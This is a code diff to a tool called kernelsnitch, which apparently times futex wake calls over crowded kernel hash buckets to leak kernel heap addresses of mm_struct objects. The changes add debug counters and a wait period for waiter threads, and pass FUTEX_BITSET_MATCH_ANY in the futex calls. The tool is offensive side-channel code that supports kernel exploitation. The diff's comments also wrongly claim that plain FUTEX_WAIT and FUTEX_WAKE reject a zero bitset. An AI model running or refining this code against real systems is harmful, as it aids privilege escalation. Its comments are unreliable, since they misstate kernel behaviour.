@@ -119,6 +119,11 @@ struct kernelsnitch_shared_state {
     enum kernelsnitch_state state;
 
     int mte_enabled;
+
+    /* DEBUG: counters to verify waiter threads actually reach futex_wait */
+    volatile size_t waiters_created;
+    volatile size_t waiters_slept;
+    volatile int    wait_futex_ret;
 };
 
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
@@ -145,7 +150,14 @@ static void *__do_increase(void *arg)
     struct inc_arg *inc_arg = (struct inc_arg *)arg;
     struct kernelsnitch_shared_state *ks = inc_arg->ks;
     size_t id = inc_arg->id;
-    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
+    /* Pass FUTEX_BITSET_MATCH_ANY as val3 to bypass the kernel's
+     * !bitset early-return check (returns -EINVAL if zero). */
+    __atomic_add_fetch(&ks->waiters_slept, 1, __ATOMIC_SEQ_CST);
+    int fret = __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, FUTEX_BITSET_MATCH_ANY);
+    __atomic_store_n(&ks->wait_futex_ret, fret, __ATOMIC_SEQ_CST);
+    if (fret < 0)
+        pr_warning("FUTEX_WAIT returned %d (errno=%d)\n", fret, -fret);
+    /* If we get here, we woke up from futex_wait (rare) */
     free(inc_arg);
     return 0;
 }
@@ -171,11 +183,14 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
             created++;
         } else {
             pr_warning("pthread_create %zu failed: %d (%s)\n", i, ret, strerror(ret));
+            free(inc_arg);
         }
     }
-    WAIT();
-    if (created != amount)
-        pr_warning("waiters created=%zu/%zu for bucket id=%zu\n", created, amount, id);
+    __atomic_store_n(&ks->waiters_created, created, __ATOMIC_SEQ_CST);
+    /* give the waiters time to actually enter futex_wait in the kernel */
+    usleep(500000);
+    pr_info("ksnitch waiters created=%zu entered_futex_wait=%zu last_ret=%d\n",
+            created, ks->waiters_slept, ks->wait_futex_ret);
 }
 
 /**
@@ -203,7 +218,10 @@ static size_t __measure(size_t futex_addr)
     for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
-        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
+        /* Kernel futex_wake returns -EINVAL if bitset == 0.
+         * Pass FUTEX_BITSET_MATCH_ANY to actually reach the hash
+         * bucket and traverse the chain. Use val=1 as well. */
+        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 1, NULL, NULL, FUTEX_BITSET_MATCH_ANY));
         t1 = rdtsc_end();
         __times[l] = t1 - t0;
     }
@@ -335,6 +353,9 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
         ks->mte_enabled ? "enabled" : "disabled");
     pin_to_core(0);
     futex_init();
+    ks->waiters_created = 0;
+    ks->waiters_slept = 0;
+    ks->wait_futex_ret = 0;
     pr_info("ksnitch setup: cpus=%zd threads=%zd collisions=%zd mm_sz=%zx slab_order=%zd slab_sz=%zx hashsize=%lu mte=%zd range=[%016zx,%016zx) per_thread=%zx\n",
             ks->cpu_cnt, ks->thread_cnt, ks->collisions, ks->mm_struct_sz,
             ks->mm_slab_order, (size_t)(KS_PAGE_SIZE << ks->mm_slab_order),
@@ -493,7 +514,7 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
      * threads and the device OOMs after a handful of rounds */
     for (int round = 0; round < 2; ++round) {
         long woken = __futex((unsigned int *)&ks->inc_futex[KS_BUCKET_ID],
-                             FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL, NULL, 0);
+                             FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL, NULL, FUTEX_BITSET_MATCH_ANY);
         if (woken <= 0)
             break;
         usleep(200000);
